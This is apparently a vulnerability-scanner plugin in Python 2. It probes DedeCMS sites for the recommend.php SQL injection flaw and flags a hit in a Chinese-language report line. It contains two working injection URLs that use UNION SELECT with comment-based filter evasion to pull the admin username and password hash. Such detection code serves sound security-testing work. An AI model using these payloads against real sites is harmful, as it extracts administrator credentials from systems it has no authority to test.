#!/usr/bin/python
# -*- coding: utf-8 -*-
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger
from engine.engine_utils.rule_result_judge import page_similar


def run_domain(http,ob):
    result = []
    try:

        frame = ob.get('siteType')
        if frame and frame in ['asp', 'aspx', 'jsp']:
            return []
        scheme = ob['scheme']
        domain = ob['domain']
        header = {'Host': domain}
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        result = []

        inj_path_list = [
            "/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\%27%20or%20" \
           "mid=@%60\\%27%60/*!50000union*//*!50000select*/1,2,3,%28select%20CONCAT%280x7c," \
           "userid,0x7c,pwd%29+from+%60%23@__admin%60%20limit+0,1),5,6,7,8,9%23@%60\\%27%60+&" \
           "_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294",

            "/dede/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\%27%20or%20" \
           "mid=@%60\\%27%60/*!50000union*//*!50000select*/1,2,3,%28select%20CONCAT%280x7c," \
           "userid,0x7c,pwd%29+from+%60%23@__admin%60%20limit+0,1),5,6,7,8,9%23@%60\\%27%60+&" \
           "_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294"
        ]

        for inj_path in inj_path_list:
            new_url = "%s://%s%s" % (scheme, domain, inj_path)
            res, content = http.request(new_url, 'GET', headers=header)
            # if res and res.get('status') == '200' and re.search(r'<h2>(.*?)</h2>', content):
            if res and res.get('status') == '200' and content:
                if page_similar(res.get('status'), content, ob.get('404_page')):
                    continue
                if page_similar(res.get('status'), content, ob.get('waf_page')):
                    continue
                detail = '检测到织梦CMS\'recommend.php\'SQL注入漏洞'
                request = getRequest(new_url, domain=ob['domain'])
                response = getResponse(res,content)
                result.append(getRecord(ob, new_url, ob['level'], detail, request, response))

    except Exception, e:
        logger.error("File:DedeCms_recommendSqlScript_yd.py, run_domain function :%s" % (str(e)))

    return result

